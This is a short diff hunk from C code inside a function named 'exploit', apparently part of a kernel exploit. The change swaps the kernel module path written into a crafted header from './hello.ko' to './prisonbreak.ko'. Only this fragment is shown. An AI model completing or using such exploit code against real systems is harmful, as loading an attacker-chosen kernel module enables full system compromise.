@@ -195,7 +195,7 @@ void *exploit(void *arg) {
     // cyclic((char *)header, len);
 
     unsigned long *kernel_module_path = (unsigned long *)(header + sizeof(synchdr_t));
-    strcpy((char *)kernel_module_path, "./hello.ko");
+    strcpy((char *)kernel_module_path, "./prisonbreak.ko");
 
     // unsigned long *arguments = (unsigned long *)(header + sizeof(synchdr_t) + 500);
 
